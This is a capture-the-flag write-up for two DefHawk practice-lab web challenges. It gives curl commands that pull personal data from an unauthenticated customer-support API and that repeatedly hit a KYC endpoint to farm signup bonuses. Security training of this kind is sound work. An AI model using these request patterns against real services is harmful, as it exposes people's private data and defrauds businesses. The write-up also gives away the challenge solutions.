## [The Vault Heist](https://defhawk.com/battleground/practice-lab/the-vault-heist) : Unauthenticated API Exploitation

### **Description to Participants**  
As a part of the challenge, you must gain access to all the details associated with a user account registered on the platform with the following:  
- **Email Address:** `acmeuser@nonexistentdomain.com`  
- **Phone Number:** `8928172127`  

### **Solution**  
Analyzing the source code, you will see that the application exposes an unauthenticated API endpoint present under "acme_banking_lab % less customerSupportApp/app.js"
`/getCustomerInfo/userDetails/<mobile number>`  
<img width="1433" alt="image" src="https://github.com/user-attachments/assets/7f800999-5e82-4718-9cbb-435b77039a29" />

This endpoint, intended for the customer support panel, leaks Personally Identifiable Information (PII) of registered users when queried with their registered mobile numbers. No authentication or authorization is required to access this data.

#### **Steps to Exploit**  
1. Use the following `curl` request to query the vulnerable API endpoint:
   ```bash
   curl https://sca.challenges.defhawk.com:5000/getCustomerInfo/userDetails/8928172127
   ```
2. The API will return user details, including the flag located in the `"address"` field.

### **Challenge Flag**  
```
HACK_QUEST{..}
```

---

## **[Phantom Profile](https://defhawk.com/battleground/practice-lab/phantom-profile): Exploiting Business Logic for Unlimited Rewards**

### **Description to Participants**  
Your challenge is to exploit the banking system to get more than `1337` rupees in your bank account. Once completed, send an HTTP request to:  
`http://localhost:3000/ctf/validateChall2`  
If the condition is satisfied, you will receive the flag.

### **Solution**  
The issue lies in the server-side logic of the `/account/updateKYC` endpoint. The server does not validate whether a user has already completed their KYC, allowing repeated submissions of KYC details. Each KYC submission triggers a 100-rupee signup bonus, enabling users to repeatedly gain bonuses.

#### **Steps to Exploit**  
1. Obtain a valid session token (`sessToken`) after logging into the system.
2. Send multiple `POST` requests to the `/account/updateKYC` endpoint using the following `curl` command:  
   ```bash
   curl -X POST https://sca.challenges.defhawk.com:3000/account/updateKYC \
   -b "sessToken=<token>" \
   -F "homeAddress=123 Main Street, Cityville" \
   -F "panCard=@<path_to_pan_card_image>"
   ```
3. Repeat the above request until the account balance exceeds `1337` rupees.
4. Send a final HTTP request to the validation endpoint to receive the flag:
   ```bash
   curl http://localhost:3000/ctf/validateChall2
   ```

### **Challenge Flag**  
```
HACK_QUEST{..}
```

